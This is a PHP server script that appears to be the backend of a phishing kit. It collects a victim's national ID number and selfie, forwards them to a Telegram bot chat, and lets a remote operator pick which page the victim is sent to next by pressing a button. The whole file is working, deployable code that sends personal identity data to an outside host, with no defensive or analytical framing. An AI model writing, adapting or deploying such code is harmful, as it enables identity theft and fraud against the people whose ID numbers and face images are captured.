<?php
$config = require __DIR__ . '/config.php';
$BOT_TOKEN = $config['bot_token'];
$CHAT_ID   = $config['chat_id'];

$DIR = __DIR__ . '/capturas';
if (!is_dir($DIR)) mkdir($DIR, 0777, true);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents("php://input"), true);
    $cedula = $data['cedula'] ?? '';
    $img64  = $data['image'] ?? '';

    if (!$cedula || !$img64) {
        echo json_encode(['ok' => false, 'error' => 'Datos incompletos']);
        exit;
    }

    $tid = uniqid("u");
    $filename = "$DIR/$tid.jpg";
    $imgData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $img64));
    file_put_contents($filename, $imgData);

    $caption = "🧍‍♂️ <b>Cédula:</b> <code>$cedula</code>\n📷 <b>Selfie recibida</b>";
    $keyboard = [
        "inline_keyboard" => [
            [["text" => "1️⃣", "callback_data" => "1:$tid"]],
            [["text" => "2️⃣", "callback_data" => "2:$tid"]],
            [["text" => "3️⃣", "callback_data" => "3:$tid"]],
        ]
    ];

    curl_post("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto", [
        'chat_id' => $CHAT_ID,
        'photo' => new CURLFile($filename),
        'caption' => $caption,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ]);

    echo json_encode(['ok' => true, 'tid' => $tid]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['tid'])) {
    $tid = $_GET['tid'];

    // 1. Leer el último update_id procesado desde el archivo local plano
    $tempDir = __DIR__;
    $statusFile = $tempDir . '/last_update_' . md5($tid) . '.txt';
    $lastProcessedUpdateId = 0;
    if (file_exists($statusFile)) {
        $lastProcessedUpdateId = (int)file_get_contents($statusFile);
    }

    // 2. Poll Telegram for updates starting from the offset
    $res = file_get_contents("https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=" . ($lastProcessedUpdateId + 1) . "&timeout=5");
    $updates = json_decode($res, true);

    if (!isset($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    foreach ($updates['result'] as $update) {
        if (!isset($update['callback_query']['data'])) continue;
        $data = $update['callback_query']['data'];
        if (strpos($data, "$tid") !== false) {
            $updateId = (int)$update['update_id'];
            if ($updateId <= $lastProcessedUpdateId) {
                continue;
            }

            $action = explode(':', $data)[0];

            $msgId = $update['callback_query']['message']['message_id'];
            $user  = $update['callback_query']['from']['username'] ?? 'Usuario';
            $text  = $update['callback_query']['message']['caption'] ?? '';

            // Guardar de inmediato para evitar doble procesamiento
            file_put_contents($statusFile, $updateId);

            // Responder callback query
            $cbid = $update['callback_query']['id'];
            file_get_contents("https://api.telegram.org/bot$BOT_TOKEN/answerCallbackQuery?callback_query_id={$cbid}");

            $nuevo = $text . "\n\n✅ Acción: $action\n👤 Usuario: @$user";

            curl_post("https://api.telegram.org/bot$BOT_TOKEN/editMessageCaption", [
                'chat_id' => $CHAT_ID,
                'message_id' => $msgId,
                'caption' => $nuevo,
                'parse_mode' => 'HTML',
                'reply_markup' => json_encode(['inline_keyboard' => []])
            ]);

            echo json_encode(['ok' => true, 'redirect' => "$action.php"]);
            exit;
        }
    }

    echo json_encode(['ok' => false]);
    exit;
}

function curl_post($url, $data) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data
    ]);
    curl_exec($ch);
    curl_close($ch);
}
